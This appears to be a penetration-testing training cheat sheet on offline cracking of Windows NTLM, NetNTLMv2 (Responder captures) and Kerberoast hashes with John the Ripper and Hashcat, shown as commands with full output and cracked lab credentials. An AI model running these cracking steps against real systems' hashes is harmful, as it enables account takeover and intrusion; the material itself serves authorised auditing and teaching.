==================================================================================================================
Offline Windows password cracking
==================================================================================================================

1. Offline NTLM password hashes cracking
2. Offline NTLMv2 password hashes cracking
3. Offline krb5tgs password cracking

Note
----
Many password wordlists can be used such as the well known 'Rockyou.txt' but we can also simply generate a customized password dictionnary with the tool 'John'
and a specific wordlist containing the name of the company that we are audited, etc..
> Command: $ sudo john -wordlist:/<path>/list-of-possible-passwords.txt -rules -stdout > New-password-dictionnary.txt


==================================================================================================================
1. Offline NTLM password hashes cracking using the tool John (JTR)
==================================================================================================================

1.1. Basic password bruteforce attack
--------------------------------------
jeff@kali-Linux:~/Documents/Windows-training$ sudo john /home/jeff/Documents/Windows-training/Secretsdump-Output.txt --format=NT
Using default input encoding: UTF-8
Loaded 4 password hashes with no different salts (NT [MD4 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
                 (Guest)
Test123          (backup)


1.2. Basic password dictionnary attack
---------------------------------------
jeff@kali-Linux:~/Documents/Windows-training$ sudo john /home/jeff/Documents/Windows-training/John-pwd-to-crack.txt -format=NT --wordlist=/usr/share/wordlists/rockyou.txt --rules=all --fork=4
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 128/128 SSE2 4x3])
Remaining 1 password hash
Node numbers 1-4 of 4 (fork)
Each node loaded 1/4 of wordfile to memory (about 33 MB/node)
Press 'q' or Ctrl-C to abort, almost any other key for status
 
password321!     (user)

1 1g 0:00:01:56 DONE (2020-03-22 18:12) 0.008577g/s 1290Kp/s 1290Kc/s 1290KC/s tweety25!..nicotina!
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed


jeff@kali-Linux:~/Documents/Windows-training$ sudo john /home/jeff/Documents/Windows-training/John-pwd-to-crack.txt -format=NT --show
backup:Test123:1008:aad3b435b51404eeaad3b435b51404ee:3b1da22b1973c0bb86d4a9b6a9ae65f6:::
user:password321!:1012:aad3b435b51404eeaad3b435b51404ee:1f61eda7f8ad3a28e52caa19e2e947e1:::


==================================================================================================================
2. Offline NTLMV2 password hashes cracking with the tool Hashcat
==================================================================================================================

jeff@kali:~/$ sudo hashcat -m 5600 -a 3 /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50.txt /home/jeff/Documents/CTFs/BadBlood/password-dico-test.txt --force

hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i7-4770HQ CPU @ 2.20GHz, 512/1493 MB allocatable, 2MCU

Hashes: 43 digests; 42 unique digests, 42 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

<SNIP>

Approaching final keyspace - workload adjusted.  

BACKUP::SECURITY-LAB:e586f068fe98c6b5:88e8dfe6de7241ad846f54c22b594c58:0101000000000000c0653150de09d201b751c75ec8d99ce4000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000c8609fb9d009aa2fdb70dde9c3c16c42060365ee8fd2d5d8f40ac99b2a76b5f30a001000000000000000000000000000000000000900240063006900660073002f004200610063006b00750070005300650072007600650072003200000000000000000000000000:Test1234
BACKUP::SECURITY-LAB:08bc47c5708cf2e3:7aa873123abfb64ec1e1ffaff3429cf8:0101000000000000c0653150de09d201d9cdb7d4665b2fa6000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000c8609fb9d009aa2fdb70dde9c3c16c42060365ee8fd2d5d8f40ac99b2a76b5f30a001000000000000000000000000000000000000900240063006900660073002f004200610063006b00750070005300650072007600650072003200000000000000000000000000:Test1234
<SNIP>

Session..........: hashcat
Status...........: Exhausted
Hash.Type........: NetNTLMv2
Hash.Target......: /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50.txt
Time.Started.....: Wed Apr 15 06:11:01 2020 (1 sec)
Time.Estimated...: Wed Apr 15 06:11:02 2020 (0 secs)
Guess.Mask.......: Test1234 [8]
Guess.Queue......: 1/3 (33.33%)
Speed.#1.........:      178 H/s (0.01ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 35/42 (83.33%) Digests, 35/42 (83.33%) Salts
Progress.........: 42/42 (100.00%)
Rejected.........: 0/42 (0.00%)
Restore.Point....: 1/1 (100.00%)
Restore.Sub.#1...: Salt:41 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Test1234 -> Test1234

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.  

                                                 
Session..........: hashcat
Status...........: Exhausted
Hash.Type........: NetNTLMv2
Hash.Target......: /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50.txt
Time.Started.....: Wed Apr 15 06:11:02 2020 (0 secs)
Time.Estimated...: Wed Apr 15 06:11:02 2020 (0 secs)
Guess.Mask.......: Test123 [7]
Guess.Queue......: 2/3 (66.67%)
Speed.#1.........:     2346 H/s (0.02ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 35/42 (83.33%) Digests, 35/42 (83.33%) Salts
Progress.........: 42/42 (100.00%)
Rejected.........: 0/42 (0.00%)
Restore.Point....: 1/1 (100.00%)
Restore.Sub.#1...: Salt:41 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Test123 -> Test123

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.  

ADMINISTRATOR::SECURITY-LAB:d3ed7df5a882d6e3:acf6065034152cb94a90fe0617eff5f5:0101000000000000c0653150de09d20159b2f5e36f688bc9000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000c8609fb9d009aa2fdb70dde9c3c16c42060365ee8fd2d5d8f40ac99b2a76b5f30a001000000000000000000000000000000000000900240063006900660073002f004200610063006b00750070005300650072007600650072003200000000000000000000000000:Test123456
ADMINISTRATOR::SECURITY-LAB:ef5d88bb05777f06:370f23a8029dd8bd21010d294e3fee15:0101000000000000c0653150de09d2019aa51e82243624bb000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000c8609fb9d009aa2fdb70dde9c3c16c42060365ee8fd2d5d8f40ac99b2a76b5f30a001000000000000000000000000000000000000900240063006900660073002f004200610063006b00750070005300650072007600650072003200000000000000000000000000:Test123456
<SNIP>

Session..........: hashcat
Status...........: Cracked
Hash.Type........: NetNTLMv2
Hash.Target......: /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50.txt
Time.Started.....: Wed Apr 15 06:11:02 2020 (0 secs)
Time.Estimated...: Wed Apr 15 06:11:02 2020 (0 secs)
Guess.Mask.......: Test123456 [10]
Guess.Queue......: 3/3 (100.00%)
Speed.#1.........:     1363 H/s (0.01ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 42/42 (100.00%) Digests, 42/42 (100.00%) Salts
Progress.........: 27/42 (64.29%)
Rejected.........: 0/27 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#1...: Salt:26 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Test123456 -> Test123456

Started: Wed Apr 15 06:10:59 2020
Stopped: Wed Apr 15 06:11:03 2020

---------------------------------

jeff@kali:~$ sudo hashcat -m 5600 -a 3 /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50-2.txt /home/jeff/Documents/CTFs/BadBlood/password-dico-test.txt --force
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i7-4770HQ CPU @ 2.20GHz, 512/1493 MB allocatable, 2MCU

Hashfile '/usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50-2.txt' on line 2 (2e2439...72003200000000000000000000000000): Separator unmatched
INFO: All hashes found in potfile! Use --show to display them.

Started: Tue May 26 17:14:48 2020
Stopped: Tue May 26 17:14:48 2020

---------------------------------

jeff@kali:~$ sudo hashcat -m 5600 -a 3 /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50-2.txt /home/jeff/Documents/CTFs/BadBlood/password-dico-test.txt --force --show

Hashfile '/usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50-2.txt' on line 2 (2e2439...72003200000000000000000000000000): Separator unmatched
ADMINISTRATOR::SECURITY-LAB:fa493ec8a454937e:198a5a181dcfcadd8bf1a16a27093653:0101000000000000c0653150de09d20183059d7538ed0fdf000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000c8609fb9d009aa2fdb70dde9c3c16c42060365ee8fd2d5d8f40ac99b2a76b5f30a001000000000000000000000000000000000000900240063006900660073002f004200610063006b00750070005300650072007600650072003200000000000000000000000000:Test123456
BACKUP::SECURITY-LAB:1166f1f004ee9f91:cd99e5c1af06f514c1a054eb449e234b:0101000000000000c0653150de09d201c70ff35bc6fba542000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000c8609fb9d009aa2fdb70dde9c3c16c42060365ee8fd2d5d8f40ac99b2a76b5f30a001000000000000000000000000000000000000900240063006900660073002f004200610063006b00750070005300650072007600650072003200000000000000000000000000:Test1234


==================================================================================================================
3. Offline krb5tgs password cracking 
==================================================================================================================

3.1. Using the tool John
-------------------------
> john --format=krb5tgs Kerberoast-pwd-hashes-hashcat-rubeus-output.txt --wordlist=rockyou.txt --rules=all

Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:06:16 0.00% (ETA: 2022-03-23 15:26) 0g/s 393677p/s 1181Kc/s 1181KC/s LovedLoved..LobsterLobster
0g 0:00:07:35 0.00% (ETA: 2022-05-26 10:50) 0g/s 412419p/s 1237Kc/s 1237KC/s Achilles2achilles2..Yellow00yellow00
0g 0:00:07:52 0.00% (ETA: 2022-05-31 20:32) 0g/s 419529p/s 1258Kc/s 1258KC/s hegce..hachi
0g 0:00:09:00 0.00% (ETA: 2022-07-10 22:30) 0g/s 427341p/s 1282Kc/s 1282KC/s Hatzugay23Hatzugay23..Hateme66Hateme66
0g 0:00:15:06 0.00% (ETA: 2022-07-18 13:47) 0g/s 443169p/s 1329Kc/s 1329KC/s x2234..igi77
0g 0:00:24:36 0.00% (ETA: 2023-01-22 03:42) 0g/s 487925p/s 1463Kc/s 1463KC/s 09282674680k..09275962761k
0g 0:00:57:27 0.00% (ETA: 2024-02-09 07:53) 0g/s 535630p/s 1607Kc/s 1607KC/s Bubbles1357)..Bubba151)
0g 0:00:57:28 0.00% (ETA: 2024-02-09 06:48) 0g/s 535767p/s 1607Kc/s 1607KC/s Wriuxl8)..Willow01)
<SNIP>

> john --format=krb5tgs Kerberoast-pwd-hashes-hashcat-rubeus-output.txt --show


3.1. Using the tool Hashcat
-----------------------------

jeff@kali:~$ sudo hashcat -m 13100 -a 0 Kerberoast-attack-TGT-hashes.txt /usr/share/wordlists/rockyou.txt --force

	hashcat (v5.1.0) starting...

	<SNIP>

	* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=13100 -D _unroll'                                                                                                                                  
	* Device #1: Kernel m13100_a0-pure.837c174d.kernel not found in cache! Building may take a while...
	Dictionary cache built:
	* Filename..: /usr/share/wordlists/rockyou.txt
	* Passwords.: 14344392
	* Bytes.....: 139921507
	* Keyspace..: 14344385
	* Runtime...: 2 secs

	[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => 


	Session..........: hashcat
	Status...........: Running
	Hash.Type........: Kerberos 5 TGS-REP etype 23
	Hash.Target......: Kerberoast-attack-TGT-hashes.txt
	Time.Started.....: Wed Apr 15 17:07:02 2020 (29 secs)
	Time.Estimated...: Wed Apr 15 17:08:10 2020 (39 secs)
	Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
	Guess.Queue......: 1/1 (100.00%)
	Speed.#1.........:   629.2 kH/s (10.96ms) @ Accel:64 Loops:1 Thr:64 Vec:8
	Recovered........: 0/3 (0.00%) Digests, 0/3 (0.00%) Salts
	Progress.........: 17915904/43033155 (41.63%)
	Rejected.........: 0/17915904 (0.00%)
	Restore.Point....: 5971968/14344385 (41.63%)
	Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1
	Candidates.#1....: luvkiss1 -> lushikun

	[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => 
	<SNIP>


jeff@kali:~$ sudo hashcat -m 13100 -a 0 Kerberoast-attack-TGT-hashes.txt --show
